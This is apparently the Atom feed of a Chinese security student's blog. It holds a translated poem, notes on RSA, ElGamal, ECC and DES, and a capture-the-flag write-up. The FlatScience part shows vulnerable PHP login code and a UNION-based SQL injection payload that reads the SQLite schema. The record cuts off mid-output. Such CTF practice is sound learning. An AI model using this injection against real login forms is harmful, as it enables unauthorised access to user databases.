<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://singlemindedt.github.io/"/>
  <updated>2019-12-20T14:20:49.046Z</updated>
  <id>https://singlemindedt.github.io/</id>
  
  <author>
    <name>Smtsec</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>不可征服</title>
    <link href="https://singlemindedt.github.io/2019/12/20/%E4%B8%8D%E5%8F%AF%E5%BE%81%E6%9C%8D/"/>
    <id>https://singlemindedt.github.io/2019/12/20/不可征服/</id>
    <published>2019-12-20T13:38:09.000Z</published>
    <updated>2019-12-20T14:20:49.046Z</updated>
    
    <content type="html"><![CDATA[<p>《不可征服》</p><p>作者：威廉亨利</p><p>透过覆盖我的夜色,</p><p>我看见黑暗层层叠叠。</p><p>我感谢上天赐予我,</p><p>不可征服的灵魂。</p><p>就算被地狱紧紧拽住,</p><p>我也从未退避哀求。</p><p>遭受命运的重重打击，</p><p>我满头鲜血，却头颅高昂。</p><p>在愤怒和悲伤的尘世外,</p><p>耸立的不过是恐怖的影子,</p><p>面对未来的威胁,</p><p>我无所畏惧。</p><p>无论命运之门多么狭窄，</p><p>无论承受怎样的惩罚，</p><p>我是我命运的主宰,</p><p>我是我灵魂的统帅。</p><p><img src="https://s2.ax1x.com/2019/12/20/QX6PKg.jpg" alt="QX6PKg.jpg"><br>Invictus</p><p>Out of the night that covers me</p><p>Black as the pit from pole to pole</p><p>I thank whatever gods may be</p><p>For my unconquerable soul</p><p>In the fell clutch of circumstance</p><p>I have not winced nor cried aloud</p><p>Under the bludgeonings of chance</p><p>My head is bloody,but unbowed.</p><p>Beyond this place of wrath and tear</p><p>Looms but the Horror of the shade</p><p>And yet the menace of the years</p><p>Finds,and shall find,me unafraid</p><p>It matters not how strait the gate</p><p>How charged with punishments the scroll</p><p>I am the master of my fate</p><p>I am the captain of my soul.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;《不可征服》&lt;/p&gt;
&lt;p&gt;作者：威廉亨利&lt;/p&gt;
&lt;p&gt;透过覆盖我的夜色,&lt;/p&gt;
&lt;p&gt;我看见黑暗层层叠叠。&lt;/p&gt;
&lt;p&gt;我感谢上天赐予我,&lt;/p&gt;
&lt;p&gt;不可征服的灵魂。&lt;/p&gt;
&lt;p&gt;就算被地狱紧紧拽住,&lt;/p&gt;
&lt;p&gt;我也从未退避哀求。&lt;/p&gt;
&lt;p&gt;遭受命运的
      
    
    </summary>
    
      <category term="essay" scheme="https://singlemindedt.github.io/categories/essay/"/>
    
    
      <category term="essay" scheme="https://singlemindedt.github.io/tags/essay/"/>
    
  </entry>
  
  <entry>
    <title>公钥密码体制</title>
    <link href="https://singlemindedt.github.io/2019/12/19/%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/"/>
    <id>https://singlemindedt.github.io/2019/12/19/公钥密码体制/</id>
    <published>2019-12-19T08:15:45.000Z</published>
    <updated>2019-12-20T13:36:02.009Z</updated>
    
    <content type="html"><![CDATA[<h1 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h1><p>对称加密体制的不足：</p><ol><li>密钥的分配和管理</li><li>签名和认证<h1 id="公钥加密体制"><a href="#公钥加密体制" class="headerlink" title="公钥加密体制"></a>公钥加密体制</h1></li><li>发送方A查找接收方B的公钥</li><li>A采用公钥加密算法以B的公钥加密明文消息</li><li>A通过不安全信道将密文发送给B</li><li>B收到密文后用自己的私钥解密获取明文</li></ol><p><img src="https://s2.ax1x.com/2019/12/20/QL759J.png" alt="QL759J.png"></p><h1 id="关键：单向陷门函数"><a href="#关键：单向陷门函数" class="headerlink" title="关键：单向陷门函数"></a>关键：单向陷门函数</h1><p><strong>单向陷门函数𝒇</strong>：</p><ol><li>给出𝑓定义域中的任意元素𝑥,计算𝑓(𝑥)是容易的</li><li>给出𝑦=𝑓(𝑥)中的𝑦，计算𝑥：<ul><li>若知道设计函数𝑓时结合进去的某种信息（称为陷门），则𝑥容易计算；</li><li>若不知道该陷门信息，则𝑥难以计算<h1 id="一个公钥密码应满足："><a href="#一个公钥密码应满足：" class="headerlink" title="一个公钥密码应满足："></a>一个公钥密码应满足：</h1></li></ul></li><li>解密算法D与加密算法E互逆，即对于所有明文𝑀都有，<strong><em>𝑫(𝑬(𝑴,𝑲_𝒆),𝑲𝒅)＝𝑴</em></strong></li><li>由𝐾𝑒求出𝐾𝑑在计算上不可行</li><li>算法E和D都是高效的</li></ol><h1 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h1><p><strong><em>安全性基于大整数因子分解的困难性</em></strong></p><h2 id="RSA算法描述"><a href="#RSA算法描述" class="headerlink" title="RSA算法描述"></a>RSA算法描述</h2><p><img src="https://s2.ax1x.com/2019/12/20/QL7I39.png" alt="QL7I39.png"></p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p><img src="https://s2.ax1x.com/2019/12/20/QL7ocR.png" alt="QL7ocR.png"></p><h2 id="素数的生成"><a href="#素数的生成" class="headerlink" title="素数的生成"></a>素数的生成</h2><p>一般的，选取一个素数的过程如下：</p><ol><li>随机选一个奇数𝑛(如使用伪随机数产生器)</li><li>用某种概率性算法（如Miller-Rabin算法）对n进行一次素性检验，如果𝑛没有通过检验，转到步骤1</li><li>重复步骤2足够多次，如果𝑛都通过了检测，则认为𝑛为素数<h2 id="RSA的实现"><a href="#RSA的实现" class="headerlink" title="RSA的实现"></a>RSA的实现</h2></li></ol><p><img src="https://s2.ax1x.com/2019/12/20/QL7Tj1.png" alt="QL7Tj1.png"></p><h2 id="RSA的安全性"><a href="#RSA的安全性" class="headerlink" title="RSA的安全性"></a>RSA的安全性</h2><ol><li>保密p,q<br>已知p,q,由Euler函数φ(𝑛)=(𝑝−1)(𝑞−1)，也就可以利用欧几里得除法，根据𝑒𝑑≡1 (𝑚𝑜𝑑 φ(𝑛)), 由𝑒求出𝑑</li><li>依赖于大数分解问题</li></ol><h2 id="对RSA的攻击"><a href="#对RSA的攻击" class="headerlink" title="对RSA的攻击*"></a>对RSA的攻击*</h2><ol><li>针对𝒏分解的攻击</li><li>循环攻击</li><li><strong>同模攻击</strong></li><li>选择密文攻击 </li><li><strong>低加密指数攻击</strong> </li><li>时间攻击 <h2 id="使用RSA体制时必须注意问题："><a href="#使用RSA体制时必须注意问题：" class="headerlink" title="使用RSA体制时必须注意问题："></a>使用RSA体制时必须注意问题：</h2></li></ol><ul><li>选择素数𝑝和𝑞时，应使其欧拉函数φ(𝑝)和φ(𝑞)的最小公倍数尽可能大(φ(𝒑)和φ(𝒒) 有大的素因子)。最小公倍数越大，幂剩余函数的周期就越长—避免循环攻击</li><li>密钥中的各项参数应选得足够大—避免穷举攻击</li><li>在同一个通信网络中，不同的用户不应该使用共同的模数—避免同模攻击</li></ul><h1 id="公钥密码体制ElGamal"><a href="#公钥密码体制ElGamal" class="headerlink" title="公钥密码体制ElGamal"></a>公钥密码体制ElGamal</h1><p><strong><em>基于离散对数问题</em></strong></p><h2 id="算法描述"><a href="#算法描述" class="headerlink" title="算法描述"></a>算法描述</h2><h3 id="1-密钥生成"><a href="#1-密钥生成" class="headerlink" title="1.密钥生成"></a>1.密钥生成</h3><p>选取大素数𝑝，𝑔∈〖𝑍_𝑝〗^∗是一个生成元，𝑝,𝑔 作为系统参数所有用户共享<br>   系统中每个用户U都随机挑选整数𝑥，2≤𝑥≤ 𝑝－2，并计算：<br>                         𝑦=𝑔^𝑥(𝑚𝑜𝑑 𝑝)，<br>   <strong>𝑦作为用户U的公钥，而𝑥作为用户U的私钥</strong></p><h3 id="2-加密"><a href="#2-加密" class="headerlink" title="2.加密"></a>2.加密</h3><ol><li>用户A先把明文𝑀编码为一个在 0 到𝑝－1之间的整数𝑚；</li><li>用户A挑选一个秘密随机数 𝑟 ( 2≤ 𝑟 ≤ 𝑝－2 )，并计算：<br>𝑐1＝ 𝑔^𝑟 (𝑚𝑜𝑑 𝑝)；<br>𝑐2 ＝ 𝑚∙𝑦^𝑟(𝑚𝑜𝑑 𝑝)</li><li>用户A把二元组 (𝒄𝟏 ,𝒄𝟐) 作为密文传送给用户B<h3 id="3-解密"><a href="#3-解密" class="headerlink" title="3.解密"></a>3.解密</h3>用户B接收到密文二元组(𝑐1 ,𝑐2)后，做解密计算：<br>𝒎=𝒄𝟐∙(𝒄𝟏^𝒙 )^(−𝟏) 𝒎𝒐𝒅  𝒑</li></ol><p><img src="https://s2.ax1x.com/2019/12/20/QL7Hnx.png" alt="QL7Hnx.png"></p><h3 id="4-ElGamal算法特点："><a href="#4-ElGamal算法特点：" class="headerlink" title="4.ElGamal算法特点："></a>4.ElGamal算法特点：</h3><ol><li>非确定性：由于密文依赖于加密过程中用户A选择的随机数𝑟 ，所以加密相同的明文可能会产生不同的密文—概率加密</li><li>密文空间大于明文空间：明文空间为〖𝑍_𝑝〗^∗，而密文空间为〖𝑍_𝑝〗^∗×〖𝑍_𝑝〗^∗<h3 id="ElGamal的安全性"><a href="#ElGamal的安全性" class="headerlink" title="ElGamal的安全性"></a>ElGamal的安全性</h3></li></ol><h1 id="公钥密码体制ECC-椭圆曲线密码体制"><a href="#公钥密码体制ECC-椭圆曲线密码体制" class="headerlink" title="公钥密码体制ECC(椭圆曲线密码体制)"></a>公钥密码体制ECC(椭圆曲线密码体制)</h1><p><strong><em>基于椭圆曲线离散对数问题</em></strong><br>可用<strong>更短的密钥</strong>获得同RSA一样的安全性</p><h2 id="椭圆曲线上的运算"><a href="#椭圆曲线上的运算" class="headerlink" title="椭圆曲线上的运算"></a>椭圆曲线上的运算</h2><ul><li>𝒪 称为加法单位元，对ECC上任意点𝑃：𝑃＋𝒪 ＝𝑃</li><li>加法逆元：<br>ECC上的点𝑃 的加法逆元−𝑷定义为：具有相同 𝒙 坐标和负𝒚 坐标的点，即过𝑃点的垂线与曲线相交的另外一点</li><li>对ECC上𝑥 坐标不同的两点𝑃、𝑄，点加𝑷+𝑸定义为：<br>连接𝑃和𝑄的直线和曲线相交于点𝑅，则𝑃+𝑄的值为𝑅的加法逆元             </li><li>倍点𝑷+𝑷运算定义：<br>做点𝑃的切线，设切线与ECC交于点𝑅，则倍点为𝑅的逆元，即：2𝑃 =𝑃+𝑃= −𝑅  <pre><code>类似：𝑘𝑃=𝑃+𝑃+𝑃+…+𝑃</code></pre></li></ul><p><img src="https://s2.ax1x.com/2019/12/20/QL7WAU.png" alt="QL7WAU.png"></p><h2 id="有限域上椭圆曲线加法"><a href="#有限域上椭圆曲线加法" class="headerlink" title="有限域上椭圆曲线加法"></a>有限域上椭圆曲线加法</h2><p><img src="https://s2.ax1x.com/2019/12/20/QL7gBV.png" alt="QL7gBV.png"></p><p><img src="https://s2.ax1x.com/2019/12/20/QL7hh4.png" alt="QL7hh4.png"></p><h2 id="椭圆曲线密码算法"><a href="#椭圆曲线密码算法" class="headerlink" title="椭圆曲线密码算法"></a>椭圆曲线密码算法</h2><h3 id="1-密钥对生成"><a href="#1-密钥对生成" class="headerlink" title="1.密钥对生成"></a>1.密钥对生成</h3><h3 id="2-加密算法"><a href="#2-加密算法" class="headerlink" title="2.加密算法"></a>2.加密算法</h3><h3 id="3-解密算法"><a href="#3-解密算法" class="headerlink" title="3.解密算法"></a>3.解密算法</h3><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p><img src="https://s2.ax1x.com/2019/12/20/QL7cn0.png" alt="QL7cn0.png"></p><h2 id="公钥体制的问题"><a href="#公钥体制的问题" class="headerlink" title="公钥体制的问题"></a>公钥体制的问题</h2><p>缺少身份认证机制<br>==&gt;基于身份的加密体制IBE</p><h2 id="公钥密码体制的安全性"><a href="#公钥密码体制的安全性" class="headerlink" title="公钥密码体制的安全性"></a>公钥密码体制的安全性</h2><h2 id="公钥密码的优点（与对称密码相比）"><a href="#公钥密码的优点（与对称密码相比）" class="headerlink" title="公钥密码的优点（与对称密码相比）"></a>公钥密码的优点（与对称密码相比）</h2><ol><li><p>密钥分发简单</p></li><li><p>需秘密保存的密钥量少</p></li><li><p>可以满足互不认识的人之间私人谈话的保密性</p></li><li><p>可以实现数字签名和认证的功能</p><h2 id="公钥密码的不足（与对称密码相比）"><a href="#公钥密码的不足（与对称密码相比）" class="headerlink" title="公钥密码的不足（与对称密码相比）"></a>公钥密码的不足（与对称密码相比）</h2></li><li><p>公钥密码算法比对称密码算法慢</p></li><li><p>公钥密码算法提供更多的信息对算法进行攻击，如公钥密码算法对选择明文攻击是脆弱的，尤其明文集比较小时</p></li><li><p>数据扩展</p></li><li><p>公钥密码算法一般是建立在特定的数学难题之上，往往这种困难性只是一种设想</p></li></ol><p>#补充</p><h2 id="解决对称加密和公钥加密中的不足-混合加密"><a href="#解决对称加密和公钥加密中的不足-混合加密" class="headerlink" title="解决对称加密和公钥加密中的不足-混合加密"></a>解决对称加密和公钥加密中的不足-混合加密</h2><p><img src="https://s2.ax1x.com/2019/12/20/QL7yXq.png" alt="QL7yXq.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;原因&quot;&gt;&lt;a href=&quot;#原因&quot; class=&quot;headerlink&quot; title=&quot;原因&quot;&gt;&lt;/a&gt;原因&lt;/h1&gt;&lt;p&gt;对称加密体制的不足：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;密钥的分配和管理&lt;/li&gt;
&lt;li&gt;签名和认证&lt;h1 id=&quot;公钥加密体制&quot;&gt;&lt;a href
      
    
    </summary>
    
      <category term="notes" scheme="https://singlemindedt.github.io/categories/notes/"/>
    
      <category term="密码学" scheme="https://singlemindedt.github.io/categories/notes/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
  </entry>
  
  <entry>
    <title>分组密码</title>
    <link href="https://singlemindedt.github.io/2019/12/18/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81/"/>
    <id>https://singlemindedt.github.io/2019/12/18/分组密码/</id>
    <published>2019-12-18T08:28:39.000Z</published>
    <updated>2019-12-20T01:28:23.523Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p>将明文划分成长为𝑚(如𝑚=64或128)的分组𝑃＝(𝑝0, 𝑝1, 𝑝2, ….,𝑝<em>(𝑚−1))，各明文分组分别在长为t的密钥𝐾＝(𝑘0, 𝑘1, 𝑘2, ….,𝑘</em>(𝑡−1)) 的控制下变换成长为𝑛的密文分组𝐶＝(𝑐0, 𝑐1, 𝑐2, …,𝑐_(𝑛−1))。(一般 𝑚=𝑛)</p><p><img src="https://s2.ax1x.com/2019/12/18/QH0Oh9.png" alt="QH0Oh9.png"></p><h1 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h1><p>速度快、安全性较高、易于标准化和便于软硬件实现<br><strong>构造伪随机数生成器、序列密码、消息认证码和Hash函数的方法</strong></p><h1 id="设计要求"><a href="#设计要求" class="headerlink" title="设计要求"></a>设计要求</h1><p>1.分组长度要足够大<br>假设𝑛为分组长度，则要使2𝑛足够大，防止明文穷举攻击<br>2.密钥量要足够大<br>防止密钥穷举攻击<br>3.密码变换要足够复杂<br>使攻击者除穷举攻击外，找不到其他简洁的数学攻击方法<br>4.加密和解密运算简单<br>便于软件和硬件的实现<br>5.无数据扩展和压缩</p><h1 id="设计思想"><a href="#设计思想" class="headerlink" title="设计思想"></a>设计思想</h1><h2 id="扩散"><a href="#扩散" class="headerlink" title="扩散"></a>扩散</h2><p>扩散原则（移位）：密钥或明文的每一比特变化影响密文的许多比特的变化，以便隐蔽明文的统计特性(形象的称为雪崩效应)</p><h1 id="混淆"><a href="#混淆" class="headerlink" title="混淆"></a>混淆</h1><p>混淆原则（替代）：又称混乱原则，指密钥和明文以及密文之间的依赖关系尽可能的复杂化，以防通过统计分析法进行破译<br>（混乱必须是可逆的！）</p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><h2 id="乘积密码"><a href="#乘积密码" class="headerlink" title="乘积密码"></a>乘积密码</h2><p>扩散和混乱两种基本密码操作的组合变换(乘积密码)</p><h3 id="乘积密码的实现—SPN网络"><a href="#乘积密码的实现—SPN网络" class="headerlink" title="乘积密码的实现—SPN网络"></a>乘积密码的实现—SPN网络</h3><p>S变换起混淆的作用； P变换起扩散的作用<br>SPN具有雪崩效应：输入(明文或密钥)即使只有很小的变化，也会导致输出有很大的变化</p><h1 id="分组密码算法"><a href="#分组密码算法" class="headerlink" title="分组密码算法"></a>分组密码算法</h1><h2 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h2><p>###算法描述<br><a href="(2)">^-^</a>:(1)<br><img src="https://s2.ax1x.com/2019/12/18/QHBkhd.png" alt="QHBkhd.png"></p><h3 id="DES的加密流程图"><a href="#DES的加密流程图" class="headerlink" title="DES的加密流程图"></a>DES的加密流程图</h3><p><img src="https://s2.ax1x.com/2019/12/18/QHBV1I.png" alt="QHBV1I.png"></p><h3 id="初始置换IP和初始逆置换IP-1"><a href="#初始置换IP和初始逆置换IP-1" class="headerlink" title="初始置换IP和初始逆置换IP-1"></a>初始置换IP和初始逆置换IP-1</h3><p><img src="https://s2.ax1x.com/2019/12/18/QHBZct.png" alt="QHBZct.png"><br>(如原来第58位的数据置换后放在第1位)</p><h3 id="16轮迭代"><a href="#16轮迭代" class="headerlink" title="16轮迭代"></a>16轮迭代</h3><p>在每轮迭代中，64位的中间结果被分成左右两部分，且作为相互独立的32位数据进行处理。每轮迭代的输入是上轮的结果𝐿𝑖－1和𝑅𝑖－1</p><p><img src="https://s2.ax1x.com/2019/12/18/QHBejP.png" alt="QHBejP.png"></p><h3 id="加密函数F"><a href="#加密函数F" class="headerlink" title="加密函数F"></a>加密函数F</h3><p><img src="https://s2.ax1x.com/2019/12/18/QHBnnf.png" alt="QHBnnf.png"></p><h3 id="E扩展置换"><a href="#E扩展置换" class="headerlink" title="E扩展置换"></a>E扩展置换</h3><p>E-扩展：32比特扩展为48比特</p><p><img src="https://s2.ax1x.com/2019/12/18/QHBuB8.png" alt="QHBuB8.png"><br>扩展方法：每个输入分组的4位作为6位输出分组的中间4位，6位输出分组中的第1、6位分别由相邻两个4位分组的最外面两位扩散进入到本分组，其中第1个分组的左侧相邻分组为最后1个分组</p><p><img src="https://s2.ax1x.com/2019/12/18/QHBKHS.png" alt="QHBKHS.png"></p><p>###与子密钥异或<br>将E盒扩展得到的48位输出与子密钥𝐾𝑖进行异或运算</p><h3 id="压缩替换S-盒："><a href="#压缩替换S-盒：" class="headerlink" title="压缩替换S-盒："></a>压缩替换S-盒：</h3><p>由8个S-盒构成, 每个S-盒都是6比特的输入，4比特的输出<br>𝑠𝑖(ℎ1ℎ2ℎ3ℎ4ℎ5ℎ6)的值是对应表𝑠𝑖中(ℎ1ℎ6)行和(ℎ2ℎ3ℎ4ℎ5)列上的值</p><p><img src="https://s2.ax1x.com/2019/12/18/QHBQAg.png" alt="QHBQAg.png"></p><h3 id="S-盒的构造（计算题）"><a href="#S-盒的构造（计算题）" class="headerlink" title="S-盒的构造（计算题）"></a>S-盒的构造（计算题）</h3><p><img src="https://s2.ax1x.com/2019/12/18/QHBlNQ.png" alt="QHBlNQ.png"></p><h3 id="P-置换"><a href="#P-置换" class="headerlink" title="P-置换"></a>P-置换</h3><p>P-置换对8个S-盒的输出进行变换</p><p><img src="https://s2.ax1x.com/2019/12/18/QHB89s.png" alt="QHB89s.png"></p><h2 id="DES的解密过程"><a href="#DES的解密过程" class="headerlink" title="DES的解密过程"></a>DES的解密过程</h2><p><img src="https://s2.ax1x.com/2019/12/18/QH0zX6.png" alt="QH0zX6.png"></p><h3 id="DES子密钥生成"><a href="#DES子密钥生成" class="headerlink" title="DES子密钥生成"></a>DES子密钥生成</h3><p><strong>DES子密钥</strong>是从初始密钥(种子密钥)产生的</p><ul><li>种子密钥𝐾为64位，其中有8位用于奇偶校验，分别位于第8，16，24，32，40，48，56，64位</li><li>奇偶校验位用于检查密钥𝐾在产生和分配以及存储过程中可能发生的错误</li><li><em>DES的密钥实际上只有56位*</em></li></ul><p><img src="https://s2.ax1x.com/2019/12/18/QHBC7D.png" alt="QHBC7D.png"></p><h2 id="DES的安全性"><a href="#DES的安全性" class="headerlink" title="DES的安全性"></a>DES的安全性</h2><ul><li>对DES的S盒、迭代次数、密钥长度等设计准则的争议</li><li>DES存在一些<strong>弱密钥和半弱密钥</strong></li><li>DES的56位密钥无法抵抗穷举攻击</li><li>代数结构存在<strong>互补对称性</strong><h3 id="弱密钥"><a href="#弱密钥" class="headerlink" title="弱密钥"></a>弱密钥</h3></li><li>给定初始密钥𝑲生成子密钥时，将种子密钥（去除了奇偶校验位后）分成两个部分，如果𝑲使得这两部分的每一部分的所有位置全为0或1，则经子密钥产生器产生的各个子密钥都相同，即𝑲𝟏=𝑲𝟐=…=𝑲𝟏𝟔，则称密钥𝑲为<strong>弱密钥（共有4个）</strong></li><li>若𝑲为弱密钥，则对任意的64比特信息有：<pre><code>***𝑬𝒌(𝑬𝒌(𝒎))= 𝒎  和  𝑫𝒌(𝑫𝒌(𝒎))= 𝒎***</code></pre></li></ul><p><img src="https://s2.ax1x.com/2019/12/18/QH0jpR.png" alt="QH0jpR.png"></p><h3 id="半弱密钥"><a href="#半弱密钥" class="headerlink" title="半弱密钥"></a>半弱密钥</h3><ul><li>半弱密钥：把明文加密成相同的密文，即存在两个不同的密钥𝒌和𝒌′,使得𝑬<em>𝒌 (𝒎)=𝑬</em>(𝒌^′ ) (𝒎)</li><li>具有下述性质：<br>若𝒌和𝒌′为一对弱密钥，𝒎为明文组，则有：</li><li><strong>𝑬<em>(𝒌^′ ) (𝑬_𝒌 (𝒎))=𝑬_𝒌 (𝑬</em>(𝒌^′ ) (𝒎))=𝒎*</strong><h3 id="互补性"><a href="#互补性" class="headerlink" title="互补性"></a>互补性</h3></li><li>对明文𝒎逐位取补，记为𝒎 ̅，密钥𝑲逐位取补，记为𝒌 ̅  ， 若𝒄=𝑬𝒌(𝒎)，则有𝒄 ̅=𝑬_𝒌 ̅  (𝒎 ̅) ，称为算法上的互补性<br>由算法中两次异或运算的配置决定：两次异或运算一次在S盒之前，一次在P盒置换之后</li><li>若对DES 的明文和密钥同时取补，则扩展运算E的输出和子密钥产生器的输出也都取补，因而经异或运算后的输出和未取补时的输出一样，即到达S盒的输入数据未变，输出自然也不变，但经第二个异或运算时，由于左边数据已取补，因而输出也就取补</li></ul><p><strong><em>互补性使DES在选择明文攻击下所需的工作量减半</em></strong></p><h2 id="多重DES"><a href="#多重DES" class="headerlink" title="多重DES"></a>多重DES</h2><h3 id="3DES"><a href="#3DES" class="headerlink" title="3DES"></a>3DES</h3><p><img src="https://s2.ax1x.com/2019/12/18/QH0x6x.png" alt="QH0x6x.png"></p><h1 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h1>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;概念&quot;&gt;&lt;a href=&quot;#概念&quot; class=&quot;headerlink&quot; title=&quot;概念&quot;&gt;&lt;/a&gt;概念&lt;/h1&gt;&lt;p&gt;将明文划分成长为𝑚(如𝑚=64或128)的分组𝑃＝(𝑝0, 𝑝1, 𝑝2, ….,𝑝&lt;em&gt;(𝑚−1))，各明文分组分别在长
      
    
    </summary>
    
      <category term="notes" scheme="https://singlemindedt.github.io/categories/notes/"/>
    
      <category term="密码学" scheme="https://singlemindedt.github.io/categories/notes/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
      <category term="notes" scheme="https://singlemindedt.github.io/tags/notes/"/>
    
  </entry>
  
  <entry>
    <title>baby_web+FlatScience</title>
    <link href="https://singlemindedt.github.io/2019/12/18/baby-web/"/>
    <id>https://singlemindedt.github.io/2019/12/18/baby-web/</id>
    <published>2019-12-18T00:36:20.000Z</published>
    <updated>2019-12-18T04:46:50.635Z</updated>
    
    <content type="html"><![CDATA[<h1 id="baby-web"><a href="#baby-web" class="headerlink" title="baby_web"></a>baby_web</h1><p>题目提示：想想初始页面是哪个<br>考虑到可能是页面302重定向<br>抓包得到flag<br><img src="https://s2.ax1x.com/2019/12/18/QTyYIe.png" alt="QTyYIe.png"></p><h1 id="FlatScience"><a href="#FlatScience" class="headerlink" title="FlatScience"></a>FlatScience</h1><p>点进去有好多链接，下载PDF，跳回等；<br>查看robots.txt(<a href="https://baike.baidu.com/item/robots协议/2483797?fromtitle=robots.txt&fromid=9518761&fr=aladdin" target="_blank" rel="noopener">robots.txt</a>:是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉蜘蛛程序在服务器上什么文件是可以被查看的。)<br>访问:<a href="http://111.198.29.45:34978/robots.txt" target="_blank" rel="noopener">http://111.198.29.45:34978/robots.txt</a></p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User-<span class="string">agent:</span> *</span><br><span class="line"><span class="string">Disallow:</span> /login.php</span><br><span class="line"><span class="string">Disallow:</span> /admin.php</span><br></pre></td></tr></table></figure><p>访问login.php:<br>得到了一个登陆页面，尝试sqli,<br>提示：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Warning</span>: SQLite3::query(): Unable <span class="keyword">to</span> <span class="keyword">prepare</span> <span class="keyword">statement</span>: <span class="number">1</span>, unrecognized token: "2801497d9ca18eef4382b18d1889b8bc97e28461" <span class="keyword">in</span> /var/www/html/<span class="keyword">login</span>.php <span class="keyword">on</span> <span class="type">line</span> <span class="number">47</span></span><br><span class="line"><span class="keyword">Some</span> Error occourred!</span><br></pre></td></tr></table></figure><p>可以看到使用的是SQLite数据库,还有加密操作？</p><p>访问网页源码：<br><img src="https://s2.ax1x.com/2019/12/18/QTfmmn.png" alt="QTfmmn.png"><br>有参数提示debug;<br>尝试访问login.php?debug<br>得到如下php代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'usr'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'pw'</span>]))&#123;</span></span><br><span class="line"><span class="php">        $user = $_POST[<span class="string">'usr'</span>];</span></span><br><span class="line"><span class="php">        $pass = $_POST[<span class="string">'pw'</span>];</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        $db = <span class="keyword">new</span> SQLite3(<span class="string">'../fancy.db'</span>);</span></span><br><span class="line"><span class="php">        </span></span><br><span class="line"><span class="php">        $res = $db-&gt;query(<span class="string">"SELECT id,name from Users where name='"</span>.$user.<span class="string">"' and password='"</span>.sha1($pass.<span class="string">"Salz!"</span>).<span class="string">"'"</span>);</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($res)&#123;</span></span><br><span class="line"><span class="php">        $row = $res-&gt;fetchArray();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;Some Error occourred!"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(<span class="keyword">isset</span>($row[<span class="string">'id'</span>]))&#123;</span></span><br><span class="line"><span class="php">            setcookie(<span class="string">'name'</span>,<span class="string">' '</span>.$row[<span class="string">'name'</span>], time() + <span class="number">60</span>, <span class="string">'/'</span>);</span></span><br><span class="line"><span class="php">            header(<span class="string">"Location: /"</span>);</span></span><br><span class="line"><span class="php">            <span class="keyword">die</span>();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'debug'</span>]))</span></span><br><span class="line"><span class="php">highlight_file(<span class="string">'login.php'</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>可以看到SQL的查询语句，并且对密码进行了加密操作(sha1+salt&lt;=（alz！）);<br>页面注入不成，抓包分析下：<br>构造：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usr='union <span class="keyword">select</span> <span class="keyword">name</span>,<span class="keyword">sql</span> <span class="keyword">from</span> sqlite_master<span class="comment">--+n&amp;pw=233</span></span><br></pre></td></tr></table></figure><p>得到：<br><img src="https://s2.ax1x.com/2019/12/18/QTh5Ux.png" alt="QTh5Ux.png"></p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie:<span class="built_in"> name</span>=+CREATE+TABLE+Users<span class="meta">%28id</span>+int+primary<span 